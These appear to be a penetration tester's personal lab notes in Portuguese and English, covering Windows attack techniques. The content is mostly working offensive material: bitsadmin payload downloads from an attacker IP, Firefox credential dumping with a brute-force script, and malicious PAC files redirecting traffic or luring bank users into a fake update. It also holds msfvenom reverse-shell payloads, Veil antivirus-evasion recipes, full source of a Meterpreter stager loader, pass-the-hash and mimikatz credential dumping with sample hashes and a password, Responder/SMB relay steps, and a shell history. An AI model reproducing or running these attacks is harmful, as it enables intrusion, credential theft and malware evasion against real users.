c:\> bitsadmin /addfile hackerjob http://192.168.5.131/hexpass.exe c:\Users\welltom\Desktop\demo\hexpass.exe

c:\> bitsadmin /addfile hackerjob http://192.168.5.131/menpass.exe c:\Users\welltom\Desktop\demo\hmenpass.exe

Checando o Status
c:\> bitsadmin /list

Resumo do Job
c:\> bitsadmin /resume hackerjob

c:\> bitsadmin /list

Monitorando o Job
c:\> bitsadmin /monitor

Finaliszando o Job
c:\> bitsadmin /complete hackerjob

Removendo o Job
c:\> bitsadmin /reset

Recovery Password Firefox
--------------------------

meterpreter> lpwd
meterpreter>  pwd
c:\Users\welltom\AppData\Roaming\Mozilla\Firefox\Profiles
meterpreter> ls
233sdvsdvd.default <-- Profile

meterpreter> cd 233sdvsdvd.default
meterpreter> ls
...
cookie.sqlite
cert8.db
key3.db
signons.sqlite
...

meterpreter> download -r . .

em outra tab

# cd 233sdvsdvd.default
# ls
# 

Password Hackery on Firefox
. Random key created for new profile
. key stored in key3.db
 - migth be further encrypted with Master Password
. Passwords are encrypted with this key and stored in signons.sqlite

Reference:
http://reidersec.blogspot.in/2013/06/how-browsers-store-your-passwords-and.html

# sqlitebrowser
open the file signons.sqlite and cookie.sqlite

# 

Firepwd.py
https://github.com/lclevy/firepwd

vai em readme e baixe os modulos requeridos 
pyasn1
PyCryptor

# python firepwd.py -h
# python firepwd.py -d ../../233sdvsdvd.default

Dictionary Attack on Browser
----------------------------

Nas opções do Firefox você pode criar uma master Key para encryptar suas senhas
vamos utilizar brute-force para quebrar as senhas em key3.db e signons.sqlite

# python firepwd.py -d ./
pasword check error

# python -h

-p MASTERKEY

# vi bf-firefox.py
#!/usr/bin/env python

import sys
from subprocess import Popen, PIPE

f = open(sys.argv[1], 'r')
for line in f:
    password = line.strip()
	
	p = Popen(['./firepwd.py', '-p', password, '-d', './'], stdout=PIPE)
	output = p.stdout.read()
	
	if output.find('decrypting') != -1:
	    print "[+] Master Password: " + password
		sys.exet(0)
	
	print "[-] Failed with Master Password: " + password

print "Failure! Master Password could not be Found with the existing dictionary!"

f.close()

# python bf-firefox.py wordlist.txt

para funcionar você tem que colocar o cabeçalho no script firepwd.py.

Tempering the PAC
------------------

Proxy Auto Config or PAC
. used for assingning proxies based on policies
. Very common in Enterprises
. File is written in Javascript and runs within a sandbox

No Internet Explorer é a opção que configura automaticamente o proxy através de scripts 
Use Automatically configuration script 

Writing a PAC File

http://findproxyforurl.com/pac-functions/
. dnsDomainIs
Evaluates hostnames and returns true if hostnames match. Used mainly to match and exception individual hostnames.

Example
// If the hostname matches google.com or www.google.com
// send direct to the Internet.
 
if (dnsDomainIs(host, "google.com") || dnsDomainIs(host, "www.google.com"))
    return "DIRECT";

. shExpMatch
Will attempt to match hostname or URL to a specified shell expression, and returns true if matched.
Example
// Any requests with a hostname ending with the extension .local
// will be sent direct to the Internet.
 
if (shExpMatch(host, "*.local"))
    return "DIRECT";
Example	
// A request for the host vpn.domain.com or any request for a file or folder in the
// location http://abcdomain.com/folder/ will be sent direct to the Internet.
 
if (shExpMatch(host, "vpn.domain.com") ||
    shExpMatch(url, "http://abcdomain.com/folder/*"))
    return "DIRECT";

. isInNet
This function evaluates the IP address of a hostname, and if within a specified subnet returns true. If a hostname is passed the function will resolve the hostname to an IP address.
Example	
// If IP of requested website website falls within IP range, send direct to the Internet.
 
if (isInNet(dnsResolve(host), "172.16.0.0", "255.240.0.0"))
    return "DIRECT";

.myIpAddress
Returns the IP address of the host machine.
Example	
// If the machine requesting a website falls within IP range,
// send traffic via proxy 10.10.5.1 running on port 8080.
 
if (isInNet(myIpAddress(), "10.10.1.0", "255.255.255.0"))
    return "PROXY 10.10.5.1:8080";

. dnsResolve
Resolves hostnames to an IP address. This function can be used to reduce the number of DNS lookups, e.g. below example.
Example	
// If IP of the requested host falls within any of the ranges specified, send direct.
 
if (isInNet(dnsResolve(host), "10.0.0.0", "255.0.0.0") ||
    isInNet(dnsResolve(host), "172.16.0.0",  "255.240.0.0") ||
    isInNet(dnsResolve(host), "192.168.0.0", "255.255.0.0") ||
    isInNet(dnsResolve(host), "127.0.0.0", "255.255.255.0"))
    return "DIRECT";

.isPlainHostName
This function will return true if the hostname contains no dots, e.g. http://intranet
Useful when applying exceptions for internal websites, e.g. may not require resolution of a hostname to IP address to determine if local.

Example
// If user requests plain hostnames, e.g. http://intranet/, 
// http://webserver-name01/, send direct.
 
if (isPlainHostName(host))
    return "DIRECT";

. localHostOrDomainIs
Evaluates hostname and only returns true if exact hostname match is found.
Example
// If the Host requested is "www" or "www.google.com", send direct.
 
if (localHostOrDomainIs(host, "www.google.com"))
    return "DIRECT";

. isResolvable
Attempts to resolve a hostname to an IP address and returns true if successful. WARNING – This may cause a browser to temporarily hang if a domain isn’t resolvable.
Example	
// If the host requested can be resolved by DNS, send via proxy1.example.com.
 
if (isResolvable(host))
    return "PROXY proxy1.example.com:8080";

. dnsDomainLevels
This function returns the number of DNS domain levels (number of dots) in the hostname. Can be used to exception internal websites which use short DNS names, e.g. http://intranet
Example
// If hostname contains any dots, send via proxy1.example.com, otherwise send direct.
 
if (dnsDomainLevels(host) > 0)
    return "PROXY proxy1.example.com:8080";
    else return "DIRECT";

. weekdayRange
Allows rules to be time based, e.g. only return a proxy during specific days.
Example
// If during the period of Monday to Friday, proxy1.example.com will be returned, otherwise
// users will go direct for any day outside this period.
 
if (weekdayRange("MON", "FRI")) return "PROXY proxy1.example.com:8080";
    else return "DIRECT";

. dateRange
Allows rules to be time based, e.g. only return a proxy during specific months.
Example	
// If during the period of January to March, proxy1.example.com will be returned, otherwise
// users will go direct for any month outside this period.
 
if (dateRange("JAN", "MAR")) return "PROXY proxy1.example.com:8080";
    else return "DIRECT";

. timeRange
Allows rules to be time based, e.g. only return a proxy during specific hours.
Example	
// If during the period 8am to 6pm, proxy1.example.com will be returned, otherwise
// users will go direct for any time outside this period.
 
if (timeRange(8, 18)) return "PROXY proxy1.example.com:8080";
    else return "DIRECT";

. alert
The alert() function is not specified in the original PAC specification, although support was previously supported in several browsers, useful for outputting the value of a variable or result of a function in a manner that is viewable by the end-user and leveraged for troubleshooting PAC file rule issues.

This function is now considered unsupported and non-functional in PAC files.
Example
// Outputs the resolved IP address of the host in the browser
// to end-user or error console. 
 
resolved_host = dnsResolve(host);
alert(resolved_host);
 
# cd /var/www/html
# mkdir pacdemo
# vi proxy.pac

function FindPorxyForURL(url, host)
{
   var attacker_proxy = "PROXY 192.168.5.131:80";
   var no_proxy = "DIRECT";
   
   return attacker_proxy;
}

meterpreter>  sysinfo
win7

meterpreter> background

msf> use post/windows/manage/ie_proxypac
msf> show options
msf> set REMOTE_PAC http://192.168.5.131/pacdemo/proxy.pac
msf> set SESSION 1
msf> exploit

msf> session -i 1

meterpreter> getuid
user-common

meterpreter> ps
meterpreter> background

msf> exploit

olhe nas configurações do browser para ver se foi alterado.

# tail -f /var/log/apache2/access.og -n 0

agora vai no alvo abra o browser e coloque um site qualquer

# vi proxy.pac

function FindPorxyForURL(url, host)
{
   var attacker_proxy = "PROXY 192.168.5.131:80";
   var no_proxy = "DIRECT";
   
   if(dnsDomainIs(host, ".gmail.com"))
   {
       return attacker_proxy;
   }
   
   return no_proxy;
}

Security Concerns
. Single --> file controls where the browser goes to fetch URLs
. Can be:
  - Local (overwritten in post exploration phase)
  - Remote (breaking into server or MiTM over network)
. Very popular among malware authors
 - htts://www.securelist/en/anaysis/204792308/PAC_the_Problem_Auto_Confo

Brocking Website using a malicious
-----------------------------------

Blocking AV Sites
. point browser to 127.0.0.1:Closed_Port for any site you would like to blackhole
. Malware do this for AV websites
. Legitimate use is to block AD Network

# vi proxy.pac

function FindPorxyForURL(url, host)
{
   var attacker_proxy = "PROXY 192.168.5.131:80";
   var no_proxy = "DIRECT";
   var blackhole = "PROXY 127.0.0.1:65000";
   
   if(dnsDomainIs(host, ".avg.com") || dnsDomainIs(host, "avast.com")
   {
       return blackhole;
   }
   
   return attacker_proxy;
}

Valide no browser atacado

Social Engineering using PAC
----------------------------
. Laptop connected to FakeAP
. Karmetasploit
 - https://dev.metasloit.com/readme/projects/framework/wiki/Karmetasploit
. Layer 2 Hijack
. Redirect all requests from all IP to Attacker Server and serve malicious PAC

# vi proxy.pac

function FindPorxyForURL(url, host)
{
   var attacker_proxy = "PROXY 192.168.5.131:80";
   var no_proxy = "DIRECT";
   var blackhole = "PROXY 127.0.0.1:65000";
   
   if(dnsDomainIs(host, ".mybank.com"))
   {
       alert("Please update your software to access the banking portal");
       return blackhole;
   }
   
   return attacker_proxy;
}

# vi index.html
<html>
   <head>
      <meta http-equiv="refresh" content="0"; url=update.exe" />
   </head>
   <body>
       <h1>Please install update to access your Banking Portal</h1>
   </body>
</html>

# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.5.131 -f exe > update.exe

# msfconsole
msf> use exploit/multi/handler
msf> set payload windows/meterpreter/reverse_tcp
msf> LHOST 192.168.5.131
msf> LPORT 4444
msf> exploit
 
Valide no browser atacado

DNS Poisoning with the Hosts File
---------------------------------
. Statically define HOST:IP binings
. no DNS resolution will be done
. Malware use this to their advantage

c:\Windows\System32\drives\etc\hosts

meterpreter>  sysinfo
win7

meterpreter> background

msf> use post/windows/manage/inject_host
msf> show options
msf> set IP 192.168.5.131
msf> set DOMAIN how2security.com.br
msf> set SESSION 1
msf> exploit

Veil
----

Setup

   +-------------------+
   |    Share Folder   |
   +-------------------+
       /          \
   +------+    +------+
   | Win8 |    | Win8 |
   |McAfee|    |  AVG |
   +------+    +------+


Internals Veil

stager Basic

How a Meterpreter stager work
1. A TCP connection is opened to the handler
2. The handler sends back 4 bytes indicating the .dll size, and then transfers the .dll
3. The socket number for this TCP connection is pushed into the EDI register
4. Execution is passed to the .dll just like regular shellcode (void * or VirtualAlloc)

# cd Veil-Evasion
# ./Veil-Evasion.py 
clean
list
use c:/meterpreter/rev_http
set LHOST 192.168.5.131
set LPORT 80
info
generate
Name_Exploit
exit

# cd veil-output/handlers
# msfconsole -r Name_exploit_handler.rc

execute no windows com av mcafee

# vi veil-output/source/Name_Exploit.c

# aptitude install indent

# indent veil-output/source/Name_Exploit.c

AV testing Lab
--------------

. AV Evasion is not a silver bullet
. Its easier to develop a bullet against an AV
. AV Testing Lab

We Live on Evals!
. Windows 8 Evaluation Versions
. AV 30 Day Evaluation Versions
 -Kaspersky
 -McAfee|
 -Norton
 -Windows Defender
 -AVG
 -Avira
 -etc
 
 Aqui deve ser criado um pool de máquina com AVs instalados para criar os exploits
 e submete-los para ver sé é detectado.
 
Payload Jugglery - Creation

Criando o Payload
-----------------
Payload
  `-> Payload
Encoding
  |-> Payload 
  `-> Encode
Crypt
  |-> Payload
  |-> Encode
  |-> Crypt
  `-> Compress  
Compress
  |-> Payload
  |-> Encode
  |-> Compress
  `-> Crypt

Executando o Payload
---------------------
Payload
  `-> Run Payload 
Encoding
  |-> Decode
  `-> Run Payload
Crypt
  |-> Decompress
  |-> Decrypt
  |-> Decode
  `-> Run Payload
Compress
  |-> Decrypt
  |-> Decompress
  |-> Decode
  `-> Run Payload


Strategy
-------
. Shellcode inject -> AES Encrypt -> PyHerion Disabled
. Shellcode inject -> AES Encrypt -> PyHerion Enabled
. Shellcode inject -> AES Encrypt -> PyHerion Enabled -> Native/Hiperion Wrapper
. Shellcode inject -> AES Encrypt -> PyHerion Enabled -> Obfuscated PyInstaller

Shellcode inject -> AES Encrypt -> PyHerion Disabled
----------------------------------------------------
# ./Veil-Evasion
use python/shellcode_inject/eas_encrypt
generate
1
<Enter> meterpreter payload
192.168.5.131
8080
<Enter>
pyhdisable
1 pyinstaller

. Shellcode inject -> AES Encrypt -> PyHerion Enabled
-----------------------------------------------------
# ./Veil-Evasion
use python/shellcode_inject/eas_encrypt
set use_pyherion Y
generate
1
<Enter> meterpreter payload
192.168.5.131
8080
<Enter>
pyheneble
1 <-- pyinstaller

Shellcode inject -> AES Encrypt -> PyHerion Enabled -> Native/Hiperion Wrapper
------------------------------------------------------------------------------

# ./Veil-Evasion
use native/Hyperion
set original_exe /root/Veil-Evasion/veil-output/compliled/pyhenable.exe
generate
pyhenebledhyper

Shellcode inject -> AES Encrypt -> PyHerion Enabled -> Obfuscated PyInstaller
-----------------------------------------------------------------------------

# ./Veil-Evasion
use python/shellcode_inject/eas_encrypt
set use_pyherion Y
generate
1
<Enter> meterpreter payload
192.168.5.131
8080
<Enter>
pyhobfuscation
2 <-- pyinstaller obfuscation

AV Evasion using Metasploit Loader
----------------------------------

. https://github.com/rsmudge/metasploit-loader
. Implements the functionality of the Stage 1 of the Meterpreter Payload
. Receives the DLL and passes controlador
. AV Evasion

Esse código faz a conexão com o handler e baixa o meterpreter
/*
 * A C-based stager client compat with the Metasploit Framework
 *    based on a discussion on the Metasploit Framework mailing list
 *
 * @author Raphael Mudge (raffi@strategiccyber.com)
 * @license BSD License.
 *
 * Relevant messages:
 * * http://mail.metasploit.com/pipermail/framework/2012-September/008660.html
 * * http://mail.metasploit.com/pipermail/framework/2012-September/008664.html
 */

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winsock2.h>

/* init winsock */
void winsock_init() {
	WSADATA	wsaData;
	WORD 		wVersionRequested;

	wVersionRequested = MAKEWORD(2, 2);

	if (WSAStartup(wVersionRequested, &wsaData) < 0) {
		printf("ws2_32.dll is out of date.\n");
		WSACleanup();
		exit(1);
	}
}

/* a quick routine to quit and report why we quit */
void punt(SOCKET my_socket, char * error) {
	printf("Bad things: %s\n", error);
	closesocket(my_socket);
	WSACleanup();
	exit(1);
}

/* attempt to receive all of the requested data from the socket */
int recv_all(SOCKET my_socket, void * buffer, int len) {
	int    tret   = 0;
	int    nret   = 0;
	void * startb = buffer;
	while (tret < len) {
		nret = recv(my_socket, (char *)startb, len - tret, 0);
		startb += nret;
		tret   += nret;

		if (nret == SOCKET_ERROR)
			punt(my_socket, "Could not receive data");
	}
	return tret;
}

/* establish a connection to a host:port */
SOCKET wsconnect(char * targetip, int port) {
	struct hostent *		target;
	struct sockaddr_in 	sock;
	SOCKET 			my_socket;

	/* setup our socket */
	my_socket = socket(AF_INET, SOCK_STREAM, 0);
	if (my_socket == INVALID_SOCKET)
		punt(my_socket, "Could not initialize socket");

	/* resolve our target */
	target = gethostbyname(targetip);
	if (target == NULL)
		punt(my_socket, "Could not resolve target");


	/* copy our target information into the sock */
	memcpy(&sock.sin_addr.s_addr, target->h_addr, target->h_length);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);

	/* attempt to connect */
	if ( connect(my_socket, (struct sockaddr *)&sock, sizeof(sock)) )
		punt(my_socket, "Could not connect to target");

	return my_socket;
}


int main(int argc, char * argv[]) {
	ULONG32 size;
	char * buffer;
	void (*function)();

	winsock_init();

	if (argc != 3) {
		printf("%s [host] [port]\n", argv[0]);
		exit(1);
	}

	/* connect to the handler */
	SOCKET my_socket = wsconnect(argv[1], atoi(argv[2]));

	/* read the 4-byte length */
	int count = recv(my_socket, (char *)&size, 4, 0);
	if (count != 4 || size <= 0)
		punt(my_socket, "read a strange or incomplete length value\n");

	/* allocate a RWX buffer */
	buffer = VirtualAlloc(0, size + 5, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (buffer == NULL)
		punt(my_socket, "could not allocate buffer\n");

	/* prepend a little assembly to move our SOCKET value to the EDI register
	   thanks mihi for pointing this out
	   BF 78 56 34 12     =>      mov edi, 0x12345678 */
	buffer[0] = 0xBF;

	/* copy the value of our socket to the buffer */
	memcpy(buffer + 1, &my_socket, 4);

	/* read bytes into the buffer */
	count = recv_all(my_socket, buffer + 5, size);

	/* cast our buffer as a function and call it */
	function = (void (*)())buffer;
	function();

	return 0;
}

# i686-w64-mingw32-gcc main.c -o load-msf.exe -lws2_32

# msfconsole
msf> use exploit/multi/handler
msf> set payload windows/meterpreter/reverse_tcp
msf> LHOST 192.168.5.131
msf> LPORT 8000
msf> exploit


















--=-=-=-=-=-=-=-=-=-=-=-=-=-=

Pass the Hash
=============

C:\> whoami /all

Vai abrir um prompt como system (seu prompt tem que abir como administrator)
C:\> psexec.exe -s -i -d cmd.exe 

C:\> CQHashDumpv2.exe /samdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::

C:\> mimikatz.exe

mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:Administrator /domain:localhost /ntlm:31d6cfe0d16ae931b73c59d7e0c089c0
mimikatz # 

Abre um prompt novo como system
C:\> whoami
well

C:\> psexec.exe \\192.168.5.111 cmd.exe 

C:\> whoami
administrator

C:\> 

C:\> pd.exe -accepteula -ma lsass.exe
C:\> rem lsass3owkdwpokdok.dump lsass.dmp
C\:> mimikatz

mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonPassword

TWC Pass-theHash
================

Mark Russonovich
Tecnical Fellow Microsoft Azure

Nathan Ide 
Principal Dev Lead Microsoft Windows

Pass-the-Hash: How Attackers Spread and How to Stop Them

Pass-the-Hash == Single-Sign On

- Pass-the-Hash is the use of a saved credential or authentication
 - It exists solely to support single-sign on (SSO)
 - If you want SSO, you are exposed to PHT
- In other words:
 - If you want SSO, pass-the-hash cannot be "fixed"
 - This is not a "Windows probem"
- There are two types of pass-the-hash
 - Credential reuse: using the saved credential on the system on which  it was saved
 - Credential theft: taking the saved credential to another system and using it from there

Single-Sign On Explained
------------------------
 
1. Sue enter username and password
[ User: Sue]
[Password: a1b2c3]
2. PC creates Sue's user session
Sue's laptop
`-> Sue's User Session
    `->[ User: Sue]
	|->[Password Hash: aee9284f...]
3. PC proves knowledge of Sue's hash to Server
[PC] ----- Send -----> [SMB]
4. Server creates a session for Sue
File Server
`-> Sue's User Session

In Pass-the-Hash Technique
--------------------------
1. PC Fred user session
Fred's laptop
`-> Fred's User Session
    `->[ User: Fred]
	|->[Password Hash: 567f3as...]
2. Fred Runs malware
Fred's laptop
`-> Fred's User Session
|    `->[ User: Fred]
|	 |->[Password Hash: 567f3as...]
`-> Malware User Session
    `->[ User: Fred]
	 |->[Password Hash: 567f3as...]
3. PC proves knowledge of Fred's hash to Sue's Laptop
[Fred's PC] ----- Send -----> [Sue's PC]
4. Malware infects Sue's laptop as Fred
Sue's laptop
`-> Sue's User Session
|    `->[ User: Sue]
|	 |->[Password Hash: aee9284f...]]
`-> Malware User Session
    `->[ User: Fred]
	|->[Password Hash: 567f3as...]
    |->[ User: Sue]
	|->[Password Hash: aee9284f...]]
Malware now 1 session with 2 credential
5. Malware proves knowledge of Sue's hash to Server
   and Malware infects File Server as Sue
[PC] ----- Send -----> [SMB]

Pass-the-Hash on Windows Today
------------------------------

windows single-sign on architecture
1. Sue enter username and password
[ User: Sue]
[Password: a1b2c3]
2. PC creates Sue's user session
Local ecurity Authority (LSASS)
NTLM [NTOWF:aee9284f]
Digest [Password: a1b2c3]
Kerberos [Ticket-Granting Ticket][Service Ticket]
3. Send to credential DC
[PC] ----- Send Ticket -----> [DC]
[PC] ----- 192.168.5.1 -----> [DC]
     ----- User: Sue   -----> [DC] Share, Mail, Proxy
	 ----- Hash: aee9284f --> [DC] Portal
	 Credential Footprint
	 NTLM + Digest + Kerberos

Microsoft Windows Kerberos Pass-The-Ticket Replay Security Bypass Vulnerability

Pass-the-Hash Tools on Windows
------------------------------
1. PC creates Sue's user session
Local ecurity Authority (LSASS)
NTLM [NTOWF:aee9284f]
Digest [Password: a1b2c3]
Kerberos [Ticket-Granting Ticket][Service Ticket]
2. Amplia Security - Windows Credentials Editor
WCE --> LSASS
 `-> Credential Store

Demo
====

1ยบ Host win7x64
Login Sue|P@ssw0rd
\\pthdemo-dc\
ddclick SueOnly directory Share
cmd.exe with run administrator

c:\> cd tools\wce
c:\> wce -l
hash sue 
hash win7$

c:\> wce -l -o hash.txt
c:\> wce -K
Kerberos tickets saved in files wce_ccache and wce_krbkts

switch user

Login Fred|12qw!@QW
Login Sue|P@ssw0rd
\\pthdemo-dc\
ddclick SueOnly directory Share
cmd.exe with run administrator
 
c:\> cd tools\wce
c:\> dir \\pthdemo-dc\sueonly
access deny

c:\> wce -k
added tickets

c:\> dir \\pthdemo-dc\sueonly
list

c:\> dir \\192.168.1.1\sueonly
access deny

c:\> hash.txt

c:\> wce -s Sue:PTHDEMO:aee9284f

c:\> dir \\192.168.1.1\sueonly
list
 
Problem: Domain Credential Harvesting
-------------------------------------
Mimikatz --> LSASS
 `-> Credential Store

C:\> cd \toos\mimikatz\x64

C:\> type dump_password.bat
mimikatz privilege::debug sekurlsa::logonPasswords exit

C:\> dump_password.bat > pass.txt

C:\> pass.txt

Administrator:500:4C96A0FBF6874EC051CAAD667391099E:90370BB6D0C156B54581E89BEBE26E7D:::
 msv :
  [00000002] Primary
  * Username : welltom
  * Domain   : HOW2SEC
  * LM       : 921988ba001dc8e1c295285c92cd06b4
  * NTLM     : 25accfc9cdecc45a3029075fc13afc36
  * SHA1     : fe34fa0e846bf03de53bf7c21849d7fd92cbe103
 wdigest :
  * Username : welltom
  * Domain   : HOW2SEC
  * Password : P@ssw0rd01
 kerberos :
  * Username : welltom
  * Domain   : HOW2SEC.LOCAL
  * Password : (null)
 ssp :
 credman :


cmd.exe --> Abre o prompt
cmd.exe /k --> abre o prompt sem o cabe?alho
cmd.exe -C tree --> abre o prompt e fecha assim que executar o comando
c:\> start . <-- abre o windows explorer
c:\> start /MIN <-- abre o windows explorer minimizado.
cmd.exe /C "start /MIN explorer \\192.168.5.131"

 
SMBRelay
========

What is SMB?
------------
The Server Message Block protocol, is a remote file access protocol originally specified
by Microsoft, IBM, and Intel. It's one of the protocols most commonly used by DOS and 
Windows machines to access files on a file server.


SMB and NTLM
------------
SMB uses NTLM to perform authentication. NTLM over a Server Message Block (SMB)
transport is one of the most common uses of NTLM authentication and encryption.

NTLM uses an encrypted challenge/response protocol to authenticate a user without 
sending the user's password over the wire. Instead, the system requesting authentication 
must perfirm a calculation that proves it has access to the secured NTLM credentials.

NTLM Challenge/Response
-----------------------
[Client] 1 -------------------> [Server] This is Well. Log me in.
[Client] 2 <------------------- [Server] If this is really Well then encrypt this challenge with Well PW Hash.
[Client] 3 -------------------> [Server] Here is the challenge.
[Client] 4 <------------------- [Server] Access Granted.

NTLM Challenge/Response Relayed
-------------------------------

This is Well. Log me in.
[Client] 1 --------->[Attack]----------> [Server] 
If this is really Well then encrypt this challenge with Well PW Hash.
[Client] 2 <--------[Attack]<----------- [Server]
Here is the challenge.
[Client] 3 --------->[Attack]----------> [Server]
Access Denied				Access Granted.
[Client] 4 <--------[Attack]<----------- [Server] 

How to MiTM?
------------
. Use a Hub or Flood a Switch
. ARP Spoofing
. DNS Spoofing
. LLMNR/NBTNS Response Poising

LLMNR/NBTNS
-----------
. NetBIOS Name Service
. Link-Local Multicast Name Resolution
. LLMNR/NBTNS allows workstations to communicate by hostname without the use of a DNS Server
. LLMNR is just an updated NetBIOS. LLMNR performs the same functions NBTNS did on older Windows operationg
systems, but it has been updated to include Internet Protocol Version 6 (IPv6)

When a workstation needs to request a name lookup, it checks the following three (3) places in order:
. Localhost file
. Configured DNS Servers
. LLMNR/NetBIOS Multicast/Broadcast.

Since the final lookup is a broadcast/multicast request, any system on the local network can answer.

NBTNS/LLMNR Response Poisoning
------------------------------
. Metasploit Framework
. Responder

Responder output:
[SMB] NTLMv2-SSP Hash     	: maloy.03::HOW2SEC:1122334455667788:7785BF1C5B172B87E8A6D8AFEEFD5449:0101000
0000000005A9C1ADD56DBD201BC8E0616918A6B920000000002000A0053004D0042003100320001000A0053004D00420031003200
04000A0053004D0042003100320003000A0053004D0042003100320005000A0053004D00420031003200080030003000000000000
0000100000000200000FFD0A75CC591D195DD6A447F2871F6760FF4432CDB692BFA7B02E6AE8A75C9050A00100000000000000000
0000000000000000000900160063006900660073002F00770069006E003100500053000000000000000000

. what can I do with this?
 - Can I Pass the Hash (PtH)? 	No.
 - Can I crack the hash?		Yes.
 - Can I relay the hash?		Absolutely!

Demo
----

# Responder -i 192.168.5.131 


# msfconsole
use o handler                +----- IP do servidor de arquivos
                             v
# python smbrelayx.py -h 192.168.5.100 -e SMBRelayPayload.exe


Entre no Respodner.conf 

desabilite os:
SMB = Off
HTTP = Off

# Responder -i 192.168.5.131 

na est??o fa?a CTRL+R
\\

meterpreter> ps
meterpreter> migrate 620 <- um processo que seja executado pelo System
meterpreter>  getuid
meterpreter> use kiwi
meterpreter> creds_all
meterpreter>  shell
meterpreter> 
c:\> net user superuser /domain





Entre no Respodner.conf 

volte as configura??e os:
SMB = On
HTTP = On


# Responder -i 192.168.5.131 -bwF

na esta??o:
Abra o Browser se tiver habilitado pela busca automatica do proxy ser? apresentado o prompt
como se tiverssimos um proxy autenticado.










-=-=-=-=-=-=-=-=-=


root@kali-wellx64:/opt/well-tools/Responder/logs# history
 1025  msfconsole
 1026  netstat
 1027  netstat -atun
 1042  sqlmap --help
 1043  sqlmap -r ../../post_fake_itau.txt --dbs --random-agent --proxy="192.168.10.63:3128"
 1044  sqlmap -r ../../post_fake_itau.txt --dbs --random-agent --proxy="http://192.168.10.63:3128"
 1046  sqlmap -r ../../post_fake_itau.txt --dbs --random-agent --proxy="http://192.168.10.63:3128"
 
 1100  man ascii
 1101  man utf-16
 1102  man iso-8859-1
 1103  man utf16
 1104  man utf8
 
 
 
 1421  wget https://github.com/cldrn/nmap-nse-scripts/blob/master/scripts/smb-vuln-ms17-010.nse
 1422  ls
 1423  cat smb-vuln-ms17-010.nse
 1424  wget https://raw.githubusercontent.com/cldrn/nmap-nse-scripts/master/scripts/smb-vuln-ms17-010.nse
 1425  ls
 1426  cat smb-vuln-ms17-010.nse
 1427  cp smb-vuln-ms17-010.nse /usr/share/nmap/scripts/
 1428  nmap -A -v -p445 192.168.10.165
 1429  nmap -p445 --script smb-vuln-ms17-010 192.168.10.165
 1430  nmap -p445 --script smb-vuln-ms17-010 192.168.10.193
 1431  nmap -p445 --script smb-vuln-ms17-010 192.168.10.91
 1432  aptitude install nmap
 1433  nmap --version
 1434  nmap -h
 1435  nmap -h | grep version
 1436  nmap -h | grep update
 1437  nmap --script-updatedb
 1438  ping 192.168.10.91
 1439  nmap -p445  192.168.10.91
 1440  nmap -A -v 192.168.10.91
 1441  exit
 
 
 1443  cd /opt/
 1444  ls
 1445  cd well-tools/
 1446  l
 1447  ls
 1448  ls Pen-Test/
 1449  git clone https://github.com/SpiderLabs/Responder
 1450  ls
 1451  cd Responder
 1452  ls
 1453  cd ..
 1454  ls /opt/
 1455  ls /opt/well-tools/
 1456  cd /opt/well-tools/Responder/
 1457  ls
 1458  lsre
 1459  ./Responder.py -h
 1460  ./Responder.py -I eth0
 1461  ./Responder.py -I eth0 --lm -v
 1462  ls
 1463  ls logs/
 1464  ./Responder.py -I eth0
 1465  ./Responder.py -i 192.168.5.100
 1466  ./Responder.py -I eth0
 1467  ./Responder.py -I eth0 --lm -v
 1468  ls
 1469  exit
 1470  ifconfig
 1471  enum4linux -U 192.168.5.100
 1472  enum4linux -h
 1473  enum4linux -P 192.168.5.100
 1474  enum4linux -M 192.168.5.100
 1475  enum4linux -M 192.168.5.132
 1476  enum4linux -P 192.168.5.132
 1477  enum4linux -U 192.168.5.132
 1478  john -h
 1479  john /opt/well-tools/Responder/logs/SMB-NTLMv1-SSP-192.168.5.132.txt
 1480  john /opt/well-tools/Responder/logs/SMB-NTLMv2-192.168.5.130.txt
 1481  cd ../
 1482  ls
 1483  ls Pen-Test/
 1484  mkdir wordlists
 1485  mv ~/Desktop/words_leak_user.txt wordlist-leak1.txt
 1486  ls
 1487  mv wordlist-leak1.txt wordlist/
 1488  mv wordlist-leak1.txt wordlists/
 1489  cd wordlists/
 1490  ls
 1491  head -n 10 wordlist-leak1.txt
 1492  head -n 10 wordlist-leak1.txt | cut -d"|" -f2
 1493  cat wordlist-leak1.txt | cut -d"|" -f2 > wordlist-leak01.txt
 1494  head wordlist-leak01.txt
 1495  echo "P@ssw0rd01" >> wordlist-leak01.txt
 1496  ls
 1497  john -h
 1498  john /opt/well-tools/Responder/logs/SMB-NTLMv1-SSP-192.168.5.132.txt --wordlist=wordlist-leak01.txt
 1499  head wordlist-leak01.txt
 1500  cat wordlist-leak01.txt | wc -l
 1501  tail wordlist-leak01.txt
 1502  cat wordlist-leak01.txt | grep P@ss
 1503  vi ~/.bashrc
 1504  source ~/.bashrc
 1505  cat wordlist-leak01.txt | grep P@ss
 1506  exit
 1507  ifconfig
 1508  ping 192.168.5.100
 1509  clear
 1510  nslookup
 1511  host -t srv win12.how2sec.local
 1512  host win12.how2sec.local
 1513  host _msdcs.how2sec.local
 1514  host -t srv _msdcs.how2sec.local
 1515  host -t any _ldap._tcp.dc._msdcs.how2sec.local
 1516  nbtscan 192.168.5.100
 1517  smbget -i 192.168.5.100
 1518  smbtree 192.168.5.100
 1519  smbget --hlp
 1520  smbget --help
 1521  smbtree --help
 1522  smbtree --domains
 1523  smbtree --domains -N
 1524  smbtree -b
 1525  smbtree -b -N
 1526  nmblookup -M -
 1527  nmblookup -M
 1528  nmblookup --workgroup=HOW2SEC
 1529  nmblookup --workgroup=HOW2SEC 192.168.10.0
 1530  nmblookup --workgroup=HOW2SEC 192.168.10.255
 1531  nmblookup --workgroup=HOW2SEC 1win12
 1532  nmblookup --workgroup=HOW2SEC win12
 1533  nmblookup -M --workgroup=HOW2SEC win12
 1534  nmblookup -M 192.168.5.0
 1535  man nmblookup
 1536  nmblookup -U how2sec.local -R "HOW2SEC#1c"
 1537  nmblookup -U how2sec.local -R "HOW2SEC#1D"
 1538  nmblookup -U how2sec.local -R "HOW2SEC#00"
